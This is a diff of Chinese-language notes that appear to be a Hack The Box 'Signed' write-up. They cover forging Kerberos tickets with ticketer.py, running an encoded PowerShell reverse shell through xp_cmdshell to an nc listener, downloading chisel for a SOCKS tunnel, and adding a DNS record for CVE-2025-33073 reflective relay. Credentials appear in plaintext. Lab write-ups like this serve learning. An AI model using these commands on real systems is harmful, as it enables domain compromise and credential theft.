@@ -861,8 +861,8 @@ b'cbfcf88****************************\r\n'
 SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt', SINGLE_CLOB) AS Contents;
 ERROR(DC01): Line 1: Cannot bulk load. The file "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" does not exist or you don't have file access rights.
 ```
-____________
-#### SIGNED\Administrator  dbo@master
+______________________________________方向错了
+#### SIGNED\Administrator  dbo@master --> -groups 1105 Administrator
 ```
 [★]$ ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 -groups 1105 Administrator
 [★]$ KRB5CCNAME=Administrator.ccache mssqlclient.py -no-pass -k  DC01.signed.htb
@@ -901,27 +901,77 @@ signed\mssqlsvc
 
 NULL              
 ```
-##### 验证伪造的票据已成功授予系统管理员权限
+______________________________________
+#### SIGNED\mssqlsvc  dbo@master --> -user-id 1103 -groups '512,1105' doesntmatter
 ```
-SQL (SIGNED\mssqlsvc  dbo@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
-    
--   
-1   
+SQL (SIGNED\mssqlsvc  dbo@master)> xp_cmdshell "powershell -e JABF..."
+```
+```
+ [★]$ sudo nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.10.15.139] from (UNKNOWN) [10.129.8.38] 52688
+whoami 
+signed\mssqlsvc
+PS C:\Windows\system32> cd ..\..\programdata
+PS C:\programdata> iwr http://10.10.15.139:8011/chisel.exe -o chisel.exe
+PS C:\programdata> .\chisel.exe client 10.10.15.139:8000 R:socks
+```
+```
+[★]$ ./chisel_1.11.5_linux_amd64 server --reverse -p 8000
+2026/03/22 02:53:35 server: Reverse tunnelling enabled
+2026/03/22 02:53:35 server: Fingerprint Zs1rQra2VE9MoXS9ICEEytuDYui5xq/I9fCTJcgdf8k=
+2026/03/22 02:53:35 server: Listening on http://0.0.0.0:8000
+2026/03/22 02:55:25 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
 
-SQL (SIGNED\mssqlsvc  dbo@master)> EXEC sp_configure 'show advanced options', 1;
-INFO(DC01): Line 196: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
-SQL (SIGNED\mssqlsvc  dbo@master)> RECONFIGURE;
-SQL (SIGNED\mssqlsvc  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1;
-INFO(DC01): Line 196: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
-SQL (SIGNED\mssqlsvc  dbo@master)> RECONFIGURE;
+```
+```
+[★]$ sudo proxychains netexec smb 127.0.0.1
+[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.16
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:135  ...  OK
+SMB         127.0.0.1       445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:SIGNED.HTB) (signing:True) (SMBv1:False)
+```
+```
+[★]$ proxychains nc -zv 10.129.8.38 445
+[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.16
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.8.38:445  ...  OK
+10.129.8.38 [10.129.8.38] 445 (microsoft-ds) open : Operation now in progress
+
+```
+#### 搜索：krbrelays github
+```
+[★]$ git clone https://github.com/dirkjanm/krbrelayx
+Cloning into 'krbrelayx'...
+remote: Enumerating objects: 270, done.
+remote: Counting objects: 100% (145/145), done.
+remote: Compressing objects: 100% (69/69), done.
+remote: Total 270 (delta 107), reused 85 (delta 76), pack-reused 125 (from 1)
+Receiving objects: 100% (270/270), 112.83 KiB | 7.52 MiB/s, done.
+Resolving deltas: 100% (152/152), done.
+[~/krbrelayx][★]$ ls
+addspn.py  dnstool.py  krbrelayx.py  lib  LICENSE  printerbug.py  README.md
+
+[★]$ python3 -m venv .venv
+[★]$ source .venv/bin/activate
+(.venv) [~/krbrelayx][★]$ pip3 install impacket
+(.venv) [~/krbrelayx][★]$ pip3 install pycryptodome
+(.venv) [~/krbrelayx][★]$ python3 dnstool.py -u 'SIGNED\MSSQLSVC' -p 'purPLE9795!@' -a add -r dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d 10.10.15.139 10.129.8.38
 
 
 ```
-https://github.com/antonioCoco/RunasCs
+https://app.hackthebox.com/machines/Signed?sort_by=created_at&sort_type=desc
+#### 搜索：CVE-2025-33073
+https://www.synacktiv.com/sites/default/files/2025-06/x33fcon-reflective_relay-cve-2025-33073.pdf
+#### 在 PDF 里看到的奇怪字符串：构造的特殊 DNS 名（marshalled structure）
 ```
-[★]$ wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
-[★]$ unzip RunasCs.zip
-Archive:  RunasCs.zip
-  inflating: RunasCs.exe             
-  inflating: RunasCs_net2.exe
+Doing some Kerberos relay research
+Kerberos relaying has already been shown by James Forshaw
+Coerce the target using a specific DNS record (marshalled structure)
+<target>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
 ```
+#### 用来欺骗 Windows：“这是本地认证 → 触发 NTLM local auth → SYSTEM token”
